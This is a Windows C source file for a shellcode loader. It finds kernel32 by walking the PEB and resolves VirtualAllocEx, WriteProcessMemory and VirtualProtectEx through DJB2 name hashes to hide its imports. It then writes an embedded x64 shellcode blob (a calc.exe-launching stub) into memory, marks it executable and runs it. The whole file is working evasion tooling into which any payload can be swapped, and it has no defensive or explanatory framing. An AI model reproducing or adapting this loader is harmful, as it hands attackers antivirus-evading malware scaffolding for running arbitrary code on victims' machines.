#include <windows.h>
#include <stdio.h>
#include <winternl.h>   

#define GetPeb() ((PPEB)__readgsqword(0x60))
#define GetCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define RESOLVE_API(name, signature, hModHash, funcHash) \
    signature name = (signature)MyGetProcAddress(MyGetModuleHandle(hModHash), funcHash); \
    if (!name) { \
        fprintf(stderr, "[-] Failed to resolve API: %s\n", #name); \
        return 1; \
    } 

typedef LPVOID( WINAPI* fnVirtualAllocEx )(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef BOOL( WINAPI* fnWriteProcessMemory )(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef BOOL( WINAPI* fnVirtualProtectEx )(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

#define HASH_KEY 5381

#define KERNEL32_HASH               0x000000000002B5F0
#define VIRTUALALLOCEX_HASH         0x000000005775BD54
#define WRITEPROCESSMEMORY_HASH     0x00000000B7930AE8
#define VIRTUALPROTECTEX_HASH       0x000000005B6B908A

typedef struct _LDR_DATA_TABLE_ENTRY_ {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    /* .... */
} LDR_DATA_TABLE_ENTRY_, * PLDR_DATA_TABLE_ENTRY_;

unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int payload_len = 276;

UINT_PTR HashString( LPVOID String, UINT_PTR Length, BOOL Upper ) {
    ULONG Hash = HASH_KEY;
    PUCHAR Ptr = String;

    if ( !String ) {
        return 0;
    }

    do {
        UCHAR character = *Ptr;

        if ( !Length ) {
            if ( !*Ptr ) break;
        }
        else {
            if ( ( ULONG )( Ptr - ( PUCHAR )String ) >= Length ) {
                break;
            }

            if ( !*Ptr ) {
                ++Ptr;
            }
        }

        if ( Upper ) {
            if ( character >= 'a' ) {
                character -= 0x20;
            }
        }

        Hash = ( ( Hash << 5 ) + Hash ) + character;
        ++Ptr;
    } while ( TRUE );

    return Hash;
}

HMODULE MyGetModuleHandle( UINT_PTR Hash ) {
    PPEB peb = GetPeb();
    PLIST_ENTRY moduleList = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;

    while ( currentEntry != moduleList ) {
        PLDR_DATA_TABLE_ENTRY_ entry = CONTAINING_RECORD( currentEntry, LDR_DATA_TABLE_ENTRY_, InMemoryOrderLinks );
        // wprintf( L"Loaded Module: %s\n", entry->BaseDllName.Buffer );
        // printf( "[+] Hash of %ls: 0x%p\n", entry->BaseDllName.Buffer, HashString( entry->BaseDllName.Buffer, 0, TRUE ) );
        if ( entry->BaseDllName.Buffer && HashString( entry->BaseDllName.Buffer, 0, TRUE ) == Hash ) {
            return ( HMODULE )entry->DllBase;
        }
        currentEntry = currentEntry->Flink;
    }
    return NULL;
}

PVOID MyGetProcAddress( HMODULE hModule, UINT_PTR Hash ) {

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;
    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( BYTE* )hModule + pDosHeader->e_lfanew );
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;

    if ( !exportDirRVA ) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = ( PIMAGE_EXPORT_DIRECTORY )( ( BYTE* )hModule + exportDirRVA );
    PDWORD pAddressOfNames = ( PDWORD )( ( BYTE* )hModule + pExportDir->AddressOfNames );
    PDWORD pAddressOfFunctions = ( PDWORD )( ( BYTE* )hModule + pExportDir->AddressOfFunctions );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( BYTE* )hModule + pExportDir->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDir->NumberOfFunctions; i++ ) {
        LPCSTR functionaName = ( LPCSTR )( ( BYTE* )hModule + pAddressOfNames[ i ] );
        // printf( "[+] Function Name: %s\n", functionaName );
        if ( HashString( ( LPVOID )functionaName, 0, TRUE ) == Hash ) {
            return ( PVOID )( ( BYTE* )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ] );
        }
    }
    return NULL;
}

VOID GetHash( LPCSTR funcName ) {
    UINT_PTR Hash = HashString( ( LPVOID )funcName, 0, TRUE );

    char upperName[ 256 ];
    strcpy_s( upperName, sizeof( upperName ), funcName );
    _strupr_s( upperName, sizeof( upperName ) );

    char macro[ 256 ];
    sprintf_s( macro, sizeof( macro ), "#define %s_HASH", upperName );
    printf( "%-40s 0x%p\n", macro, ( void* )Hash );

}

int main() {

    // LPCWSTR sKernel32 = L"kernel32.dll";
    HMODULE hKernel32 = MyGetModuleHandle( KERNEL32_HASH );

    if ( !hKernel32 ) {
        fprintf( stderr, "[-] Failed to resolve module\n" );
        return 1;
    }

    // printf( "[+] Module %ls found at address: 0x%p\n", sKernel32, hKernel32 );

    // UINT_PTR hashLoadLibraryA = HashString( "LoadLibraryA", 0, TRUE );
    // printf( "[+] Hash of LoadLibraryA: 0x%p\n", hashLoadLibraryA );

    // GetHash( "VirtualAllocEx" );
    // GetHash( "WriteProcessMemory" );
    // GetHash( "VirtualProtectEx" );

    RESOLVE_API( pVirtualAllocEx, fnVirtualAllocEx, KERNEL32_HASH, VIRTUALALLOCEX_HASH );
    RESOLVE_API( pWriteProcessMemory, fnWriteProcessMemory, KERNEL32_HASH, WRITEPROCESSMEMORY_HASH );
    RESOLVE_API( pVirtualProtectEx, fnVirtualProtectEx, KERNEL32_HASH, VIRTUALPROTECTEX_HASH );

    PVOID exec_mem = pVirtualAllocEx( GetCurrentProcess(), NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !exec_mem ) {
        fprintf( stderr, "[-] Failed to allocate memory in the current process\n" );
        return 1;
    }

    printf( "[+] Allocated %d bytes at 0x%p\n", payload_len, exec_mem );

    SIZE_T bytesWritten;
    if ( !pWriteProcessMemory( GetCurrentProcess(), exec_mem, payload, payload_len, &bytesWritten ) ) {
        fprintf( stderr, "[-] WriteProcessMemory failed with error %ld\n", GetLastError() );
    }

    printf( "[+] Written %lld bytes to memory\n", bytesWritten );

    DWORD oldProtect;
    if ( !pVirtualProtectEx( GetCurrentProcess(), exec_mem, payload_len, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] Failed to change memory protection\n" );
        return 1;
    }

    ( ( void( * )( ) )exec_mem )( );


    return 0;
}